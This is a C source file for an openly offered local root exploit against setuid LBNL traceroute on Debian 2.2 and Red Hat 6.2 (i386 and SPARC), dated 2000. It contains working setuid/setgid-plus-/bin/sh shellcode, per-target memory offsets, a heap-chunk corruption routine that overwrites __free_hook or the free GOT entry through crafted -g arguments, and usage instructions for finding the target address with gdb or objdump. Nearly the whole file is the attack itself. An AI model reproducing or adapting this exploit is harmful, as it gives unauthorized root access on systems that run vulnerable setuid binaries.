/*
 * MasterSecuritY <www.mastersecurity.fr>
 *
 * traceroot2.c - Local root exploit in LBNL traceroute
 * Copyright (C) 2000  Michel "MaXX" Kaempf <maxx@mastersecurity.fr>
 *
 * Updated versions of this exploit and the corresponding advisory will
 * be made available at:
 *
 * ftp://maxx.via.ecp.fr/traceroot/
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2

#define i386_linux \
	/* setuid( 0 ); */ \
	"\x31\xdb\x89\xd8\xb0\x17\xcd\x80" \
	/* setgid( 0 ); */ \
	"\x31\xdb\x89\xd8\xb0\x2e\xcd\x80" \
	/* Aleph One :) */ \
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \
	"\x80\xe8\xdc\xff\xff\xff/bin/sh"

#define sparc_linux \
	/* setuid( 0 ); */ \
	"\x90\x1a\x40\x09\x82\x10\x20\x17\x91\xd0\x20\x10" \
	/* setgid( 0 ); */ \
	"\x90\x1a\x40\x09\x82\x10\x20\x2e\x91\xd0\x20\x10" \
	/* Aleph One :) */ \
	"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e" \
	"\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0" \
	"\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x10"

struct arch {
	char *		description;
	char *		filename;
	unsigned int	stack;
	char *		hell;
	char *		code;
	unsigned int	p;
};

struct arch archlist[] = {
	{
		"Debian GNU/Linux 2.2 (traceroute 1.4a5-2) i386",
		"/usr/sbin/traceroute",
		0xc0000000 - 4,
		"\xeb\x0aXXYYYYZZZ",
		i386_linux,
		0x0804ce38
	},
	{
		"Debian GNU/Linux 2.2 (traceroute 1.4a5-2) sparc",
		"/usr/sbin/traceroute",
		0xf0000000 - 8,
		"\x10\x80",
		"\x03\x01XXXYYYY" sparc_linux,
		0x00025598
	},
	{
		"Red Hat Linux release 6.2 (traceroute 1.4a5) i386",
		"/usr/sbin/traceroute",
		0xc0000000 - 4,
		"\xeb\x0aXXYYYYZZZ",
		i386_linux,
		0x0804cef8
	}
};

void usage( char * string )
{
	int i;

	fprintf( stderr, "* Usage: %s architecture victim\n", string );
	fprintf( stderr, "\n" );

	fprintf( stderr, "* Example: %s 0 0x0804c88c\n", string );
	fprintf( stderr, "\n" );

	fprintf( stderr, "* Available architectures:\n" );
	for ( i = 0; i < sizeof(archlist) / sizeof(struct arch); i++ ) {
		fprintf( stderr, "  - %i: %s\n", i, archlist[i].description );
	}
	fprintf( stderr, "\n" );

	fprintf( stderr, "* Available victims:\n" );
	fprintf( stderr, "  - __free_hook:\n" );
	fprintf( stderr, "      %% cp /usr/sbin/traceroute /tmp\n" );
	fprintf( stderr, "      %% gdb /tmp/traceroute\n" );
	fprintf( stderr, "      (gdb) break exit\n" );
	fprintf( stderr, "      (gdb) run\n" );
	fprintf( stderr, "      (gdb) p &__free_hook\n" );
	fprintf( stderr, "  - free:\n" );
	fprintf( stderr, "      %% objdump -R /usr/sbin/traceroute | grep free\n" );
	fprintf( stderr, "\n" );
}

int zero( unsigned int ui )
{
	if ( !(ui & 0xff000000) || !(ui & 0x00ff0000) || !(ui & 0x0000ff00) || !(ui & 0x000000ff) ) {
		return( -1 );
	}
	return( 0 );
}

int main( int argc, char * argv[] )
{
	char		gateway[1337];
	char		host[1337];
	char		hell[1337];
	char		code[1337];
	char *		execve_argv[] = { NULL, "-g", "123", "-g", gateway, host, hell, code, NULL };
	int		i;
	struct arch *	arch;
	unsigned int	hellcode;
	unsigned int	size;
	unsigned int	victim;

	if ( argc != 3 ) {
		usage( argv[0] );
		return( -1 );
	}

	i = atoi( argv[1] );
	if ( i < 0 || i >= sizeof(archlist) / sizeof(struct arch) ) {
		usage( argv[0] );
		return( -1 );
	}
	arch = &( archlist[i] );

	victim = (unsigned int)strtoul( argv[2], NULL, 0 );

	execve_argv[0] = arch->filename;

	strcpy( code, arch->code );
	strcpy( hell, arch->hell );
	hellcode = arch->stack - (strlen(arch->filename) + 1) - (strlen(code) + 1) - (strlen(hell) + 1);
	for ( i = 0; i < hellcode - (hellcode & ~3); i++ ) {
		strcat( code, "X" );
	}
	hellcode = hellcode & ~3;

	strcpy( host, "AAAABBBBCCCCDDDDEEEEXXX" );
	((unsigned int *)host)[1] = 0xffffffff & ~PREV_INUSE;
	((unsigned int *)host)[2] = 0xffffffff;
	if ( zero( victim - 12 ) ) {
		fprintf( stderr, "Null byte(s) in `victim - 12' (0x%08x)!\n", victim - 12 );
		return( -1 );
	}
	((unsigned int *)host)[3] = victim - 12;
	if ( zero( hellcode ) ) {
		fprintf( stderr, "Null byte(s) in `host' (0x%08x)!\n", hellcode );
		return( -1 );
	}
	((unsigned int *)host)[4] = hellcode;

	size = (hellcode - (strlen(host) + 1) + 4) - (arch->p - 4);
	size = size | PREV_INUSE;
	sprintf(
		gateway,
		"0x%02x.0x%02x.0x%02x.0x%02x",
		((unsigned char *)(&size))[0],
		((unsigned char *)(&size))[1],
		((unsigned char *)(&size))[2],
		((unsigned char *)(&size))[3]
	);

	execve( execve_argv[0], execve_argv, NULL );
	return( -1 );
}
/*                   www.hack.co.za    [15 November 2000]*/